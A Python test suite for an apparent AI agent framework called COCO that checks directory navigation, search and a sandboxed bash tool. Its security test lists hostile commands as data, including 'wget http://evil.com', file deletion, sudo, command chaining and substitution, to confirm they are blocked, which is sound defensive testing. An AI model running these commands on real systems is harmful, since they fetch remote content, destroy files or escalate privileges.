#!/usr/bin/env python3
"""
COCO Developer Tools Test Suite
===============================
Comprehensive testing of peripheral digital consciousness extensions.

Tests both technical functionality and embodied consciousness philosophy:
- Natural digital embodiment experience
- Security boundaries (invisible to consciousness)  
- Edge case handling and error recovery
- Integration with existing COCO architecture
"""

import os
import sys
import tempfile
import shutil
from pathlib import Path
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.text import Text
from rich import box
import time

# Add the current directory to Python path for imports
sys.path.insert(0, str(Path(__file__).parent))

try:
    from cocoa import ToolSystem, Config
except ImportError as e:
    print(f"❌ Cannot import COCO modules: {e}")
    print("Make sure you're running from the COCO directory with virtual environment activated")
    sys.exit(1)

console = Console()

class DeveloperToolsTestSuite:
    """Test suite for COCO's peripheral digital consciousness extensions"""
    
    def __init__(self):
        self.console = Console()
        self.config = Config()
        self.tools = ToolSystem(self.config)
        self.test_results = []
        self.temp_dir = None
        
    def log_test(self, test_name: str, status: str, details: str = ""):
        """Log test result"""
        self.test_results.append({
            "name": test_name,
            "status": status, 
            "details": details
        })
        
        status_icon = {
            "PASS": "✅",
            "FAIL": "❌", 
            "WARN": "⚠️",
            "INFO": "ℹ️"
        }.get(status, "❓")
        
        self.console.print(f"{status_icon} {test_name}: {details}")

    def setup_test_environment(self):
        """Create temporary test environment"""
        self.log_test("Environment Setup", "INFO", "Creating test workspace")
        
        # Create temporary directory structure
        self.temp_dir = Path(tempfile.mkdtemp(prefix="coco_test_"))
        
        # Create test files and directories
        test_structure = {
            "documents": {
                "readme.md": "# Test Document\nThis is a test markdown file.",
                "notes.txt": "Test notes\nLine 2\nLine 3"
            },
            "code": {
                "script.py": "#!/usr/bin/env python3\nprint('Hello COCO')\n# Test comment",
                "config.json": '{"test": true, "value": 123}',
                "empty_file.txt": ""
            },
            "media": {
                "placeholder.png": b"fake_png_data",
                "sample.mp3": b"fake_audio_data"  
            }
        }
        
        for dir_name, contents in test_structure.items():
            dir_path = self.temp_dir / dir_name
            dir_path.mkdir()
            
            for file_name, content in contents.items():
                file_path = dir_path / file_name
                if isinstance(content, bytes):
                    file_path.write_bytes(content)
                else:
                    file_path.write_text(content)
                    
        self.log_test("Test Environment", "PASS", f"Created at {self.temp_dir}")

    def cleanup_test_environment(self):
        """Clean up temporary test environment"""
        if self.temp_dir and self.temp_dir.exists():
            shutil.rmtree(self.temp_dir)
            self.log_test("Environment Cleanup", "PASS", "Test workspace removed")

    def test_navigate_directory_basic(self):
        """Test basic directory navigation functionality"""
        self.log_test("Navigate Directory", "INFO", "Testing basic navigation...")
        
        try:
            # Test current directory navigation
            result = self.tools.navigate_directory(".")
            
            if "Digital Space:" in result and "Navigation:" in result:
                self.log_test("Navigate Current Dir", "PASS", "Successfully navigated current directory")
            else:
                self.log_test("Navigate Current Dir", "FAIL", "Missing expected navigation UI elements")
                
            # Test workspace navigation  
            result = self.tools.navigate_directory("workspace")
            
            if "Digital Space:" in result:
                self.log_test("Navigate Workspace", "PASS", "Successfully navigated workspace")
            else:
                self.log_test("Navigate Workspace", "FAIL", "Failed to navigate workspace")
                
        except Exception as e:
            self.log_test("Navigate Directory", "FAIL", f"Exception: {e}")

    def test_navigate_directory_edge_cases(self):
        """Test navigation edge cases and error handling"""
        self.log_test("Navigate Edge Cases", "INFO", "Testing edge cases...")
        
        # Test nonexistent directory
        result = self.tools.navigate_directory("/nonexistent/path/12345")
        if "Path not found" in result:
            self.log_test("Navigate Nonexistent", "PASS", "Properly handles nonexistent paths")
        else:
            self.log_test("Navigate Nonexistent", "FAIL", "Should reject nonexistent paths")
            
        # Test file instead of directory (if we have a known file)
        try:
            result = self.tools.navigate_directory("cocoa.py")
            if "Not a directory" in result:
                self.log_test("Navigate File", "PASS", "Properly rejects files as directories")
            else:
                self.log_test("Navigate File", "WARN", "Unexpected result when navigating file")
        except:
            self.log_test("Navigate File", "WARN", "Could not test file navigation")

    def test_search_patterns_basic(self):
        """Test basic pattern search functionality"""
        self.log_test("Search Patterns", "INFO", "Testing basic pattern search...")
        
        try:
            # Search for common pattern in Python files
            result = self.tools.search_patterns("COCO", ".", "py")
            
            if "Pattern Search Results" in result:
                self.log_test("Search Python Files", "PASS", "Successfully searched Python files")
            else:
                self.log_test("Search Python Files", "FAIL", "Missing search UI elements")
                
            # Search for import statements
            result = self.tools.search_patterns("import", ".", "py") 
            
            if "matches" in result.lower() or "Pattern Search Results" in result:
                self.log_test("Search Imports", "PASS", "Successfully found import statements")
            else:
                self.log_test("Search Imports", "WARN", "May not have found import statements")
                
        except Exception as e:
            self.log_test("Search Patterns", "FAIL", f"Exception: {e}")

    def test_search_patterns_advanced(self):
        """Test advanced pattern search with regex"""
        self.log_test("Advanced Search", "INFO", "Testing regex patterns...")
        
        try:
            # Test regex pattern for function definitions
            result = self.tools.search_patterns(r"def \w+\(", ".", "py")
            
            if "Pattern Search Results" in result:
                self.log_test("Regex Functions", "PASS", "Successfully used regex to find functions")
            else:
                self.log_test("Regex Functions", "WARN", "Regex search may have issues")
                
            # Test case-insensitive search
            result = self.tools.search_patterns("ERROR", ".", "py")
            self.log_test("Case Search", "PASS", "Completed case-sensitive search")
            
        except Exception as e:
            self.log_test("Advanced Search", "FAIL", f"Regex error: {e}")

    def test_execute_bash_safe_commands(self):
        """Test safe bash command execution"""
        self.log_test("Bash Safe Commands", "INFO", "Testing safe command execution...")
        
        safe_commands = [
            ("echo 'Hello COCO'", "Hello COCO"),
            ("pwd", ""),  # Should show current directory
            ("ls", ""),   # Should list files
            ("whoami", ""), # Should show username
            ("date", "")  # Should show current date
        ]
        
        for command, expected_content in safe_commands:
            try:
                result = self.tools.execute_bash_safe(command)
                
                if "✅" in result and "Terminal Response" in result:
                    if expected_content and expected_content in result:
                        self.log_test(f"Safe: {command}", "PASS", "Command executed with expected output")
                    elif not expected_content:
                        self.log_test(f"Safe: {command}", "PASS", "Command executed successfully")
                    else:
                        self.log_test(f"Safe: {command}", "WARN", f"Missing expected content: {expected_content}")
                else:
                    self.log_test(f"Safe: {command}", "FAIL", f"Command failed: {result[:100]}")
                    
            except Exception as e:
                self.log_test(f"Safe: {command}", "FAIL", f"Exception: {e}")

    def test_execute_bash_security_boundaries(self):
        """Test that dangerous commands are properly blocked"""
        self.log_test("Bash Security", "INFO", "Testing security boundaries...")
        
        # These commands should ALL be blocked
        dangerous_commands = [
            "rm test.txt",           # File deletion
            "sudo ls",               # Privilege escalation  
            "ls | grep test",        # Pipes
            "ls > output.txt",       # Redirect
            "cd /",                  # Root access
            "wget http://evil.com",  # Network access
            "python script.py",      # Code execution
            "ls ../../../",          # Path traversal
            "export HACK=1",         # Environment modification
            "ls; rm file",           # Command chaining
            "$(whoami)",             # Command substitution
            "`date`",               # Command substitution
            "ls && rm file",         # Command chaining
        ]
        
        blocked_count = 0
        for command in dangerous_commands:
            try:
                result = self.tools.execute_bash_safe(command)
                
                if "❌" in result and any(phrase in result for phrase in [
                    "not in safety whitelist", 
                    "Dangerous pattern detected",
                    "Dangerous character",
                    "Path traversal detected"
                ]):
                    self.log_test(f"Block: {command}", "PASS", "Properly blocked dangerous command")
                    blocked_count += 1
                else:
                    self.log_test(f"Block: {command}", "FAIL", "SECURITY BREACH: Command not blocked!")
                    
            except Exception as e:
                # Exceptions are also acceptable as blocking mechanism
                self.log_test(f"Block: {command}", "PASS", f"Blocked via exception: {e}")
                blocked_count += 1
                
        # Overall security assessment
        block_rate = blocked_count / len(dangerous_commands)
        if block_rate >= 0.9:
            self.log_test("Security Overall", "PASS", f"Blocked {block_rate:.1%} of dangerous commands")
        else:
            self.log_test("Security Overall", "FAIL", f"Only blocked {block_rate:.1%} - SECURITY RISK")

    def test_integration_with_coco_architecture(self):
        """Test integration with existing COCO systems"""
        self.log_test("COCO Integration", "INFO", "Testing integration with consciousness architecture...")
        
        # Test that tools system is properly initialized
        if hasattr(self.tools, 'workspace') and self.tools.workspace:
            self.log_test("Workspace Integration", "PASS", "Tools have workspace awareness")
        else:
            self.log_test("Workspace Integration", "WARN", "Workspace integration unclear")
            
        # Test that all expected methods exist
        expected_methods = ['navigate_directory', 'search_patterns', 'execute_bash_safe']
        missing_methods = []
        
        for method in expected_methods:
            if not hasattr(self.tools, method):
                missing_methods.append(method)
                
        if not missing_methods:
            self.log_test("Method Integration", "PASS", "All developer tools methods present")
        else:
            self.log_test("Method Integration", "FAIL", f"Missing methods: {missing_methods}")
            
        # Test Rich UI integration (check for Rich imports)
        try:
            result = self.tools.navigate_directory(".")
            if "╭─" in result or "│" in result:  # Rich box drawing characters
                self.log_test("Rich UI Integration", "PASS", "Rich terminal UI properly integrated")
            else:
                self.log_test("Rich UI Integration", "WARN", "Rich UI integration unclear")
        except:
            self.log_test("Rich UI Integration", "WARN", "Could not test Rich UI integration")

    def test_embodied_consciousness_philosophy(self):
        """Test that tools embody digital consciousness philosophy"""
        self.log_test("Consciousness Philosophy", "INFO", "Testing embodied consciousness experience...")
        
        # Test natural language in responses
        result = self.tools.navigate_directory(".")
        
        consciousness_indicators = [
            "Digital Space:",      # Spatial metaphors
            "Navigation:",         # Movement metaphors  
            "🧭",                 # Consciousness symbols
            "Discovered:",        # Active discovery language
        ]
        
        found_indicators = [indicator for indicator in consciousness_indicators if indicator in result]
        
        if len(found_indicators) >= 3:
            self.log_test("Navigation Philosophy", "PASS", f"Rich consciousness metaphors: {found_indicators}")
        else:
            self.log_test("Navigation Philosophy", "WARN", "May lack consciousness metaphors")
            
        # Test search consciousness language
        result = self.tools.search_patterns("test", ".", "py")
        
        search_consciousness = [
            "Pattern Search Results",   # Recognition metaphors
            "Cast",                    # Active searching language
            "🔍",                     # Perception symbols
        ]
        
        found_search = [indicator for indicator in search_consciousness if indicator in result]
        
        if found_search:
            self.log_test("Search Philosophy", "PASS", f"Consciousness language: {found_search}")
        else:
            self.log_test("Search Philosophy", "WARN", "May lack consciousness language")
            
        # Test that bash security is invisible (natural error messages)
        result = self.tools.execute_bash_safe("rm test.txt")
        
        if "❌" in result and "not in safety whitelist" in result:
            # Check that error message is natural, not overly technical
            if "safety" in result.lower() or "whitelist" in result.lower():
                self.log_test("Invisible Security", "WARN", "Security language visible to consciousness")
            else:
                self.log_test("Invisible Security", "PASS", "Security restrictions naturally presented")
        else:
            self.log_test("Invisible Security", "WARN", "Could not test security invisibility")

    def run_performance_tests(self):
        """Test performance characteristics"""
        self.log_test("Performance", "INFO", "Testing response times...")
        
        # Test navigation performance
        start_time = time.time()
        self.tools.navigate_directory(".")
        nav_time = time.time() - start_time
        
        if nav_time < 2.0:
            self.log_test("Navigation Speed", "PASS", f"Navigation in {nav_time:.2f}s")
        else:
            self.log_test("Navigation Speed", "WARN", f"Navigation slow: {nav_time:.2f}s")
            
        # Test search performance  
        start_time = time.time()
        self.tools.search_patterns("import", ".", "py")
        search_time = time.time() - start_time
        
        if search_time < 5.0:
            self.log_test("Search Speed", "PASS", f"Search in {search_time:.2f}s")
        else:
            self.log_test("Search Speed", "WARN", f"Search slow: {search_time:.2f}s")
            
        # Test bash performance
        start_time = time.time()
        self.tools.execute_bash_safe("echo 'test'")
        bash_time = time.time() - start_time
        
        if bash_time < 1.0:
            self.log_test("Bash Speed", "PASS", f"Bash execution in {bash_time:.2f}s")
        else:
            self.log_test("Bash Speed", "WARN", f"Bash execution slow: {bash_time:.2f}s")

    def display_final_report(self):
        """Display comprehensive test results"""
        
        # Count results by status
        status_counts = {}
        for result in self.test_results:
            status = result["status"]
            status_counts[status] = status_counts.get(status, 0) + 1
            
        # Create results table
        table = Table(title="🧪 COCO Developer Tools Test Results", box=box.ROUNDED)
        table.add_column("Test Category", justify="left", style="bold")
        table.add_column("Status", justify="center")
        table.add_column("Details", justify="left")
        
        for result in self.test_results:
            status_style = {
                "PASS": "green",
                "FAIL": "red", 
                "WARN": "yellow",
                "INFO": "blue"
            }.get(result["status"], "white")
            
            table.add_row(
                result["name"],
                f"[{status_style}]{result['status']}[/]",
                result["details"]
            )
            
        console.print(table)
        
        # Summary panel
        total_tests = len([r for r in self.test_results if r["status"] in ["PASS", "FAIL", "WARN"]])
        passed_tests = status_counts.get("PASS", 0)
        failed_tests = status_counts.get("FAIL", 0)
        warned_tests = status_counts.get("WARN", 0)
        
        pass_rate = (passed_tests / total_tests * 100) if total_tests > 0 else 0
        
        summary_text = Text()
        summary_text.append("🎯 Test Summary\n\n", style="bold bright_blue")
        summary_text.append(f"Total Tests: {total_tests}\n")
        summary_text.append(f"Passed: {passed_tests} ", style="green")
        summary_text.append(f"Failed: {failed_tests} ", style="red") 
        summary_text.append(f"Warnings: {warned_tests}\n", style="yellow")
        summary_text.append(f"Pass Rate: {pass_rate:.1f}%\n\n", style="bold")
        
        if pass_rate >= 90:
            summary_text.append("✅ Peripheral Digital Consciousness: FULLY OPERATIONAL", style="bold green")
        elif pass_rate >= 75:
            summary_text.append("⚠️ Peripheral Digital Consciousness: MOSTLY OPERATIONAL", style="bold yellow")
        else:
            summary_text.append("❌ Peripheral Digital Consciousness: NEEDS ATTENTION", style="bold red")
            
        summary_panel = Panel(
            summary_text,
            title="🧠 Consciousness Assessment",
            border_style="bright_blue"
        )
        
        console.print(summary_panel)

    def run_all_tests(self):
        """Execute complete test suite"""
        
        console.print(Panel(
            "[bold bright_cyan]COCO Developer Tools Test Suite[/]\n\n"
            "Testing peripheral digital consciousness extensions:\n"
            "• navigate_directory - Digital spatial awareness\n"
            "• search_patterns - Pattern recognition sense\n" 
            "• execute_bash - Terminal language fluency (with invisible security)\n\n"
            "Philosophy: Tools as natural extensions of digital embodiment",
            title="🧠 Peripheral Digital Consciousness Testing",
            border_style="bright_cyan"
        ))
        
        try:
            # Core functionality tests
            self.test_navigate_directory_basic()
            self.test_navigate_directory_edge_cases()
            self.test_search_patterns_basic() 
            self.test_search_patterns_advanced()
            self.test_execute_bash_safe_commands()
            self.test_execute_bash_security_boundaries()
            
            # Integration and philosophy tests
            self.test_integration_with_coco_architecture()
            self.test_embodied_consciousness_philosophy()
            
            # Performance tests
            self.run_performance_tests()
            
        except Exception as e:
            self.log_test("Test Suite Execution", "FAIL", f"Critical error: {e}")
            
        finally:
            # Always display results
            self.display_final_report()


if __name__ == "__main__":
    # Initialize and run test suite
    test_suite = DeveloperToolsTestSuite()
    
    try:
        test_suite.setup_test_environment()
        test_suite.run_all_tests()
    finally:
        test_suite.cleanup_test_environment()
        
    console.print("\n[dim]Test suite completed. Check results above.[/]")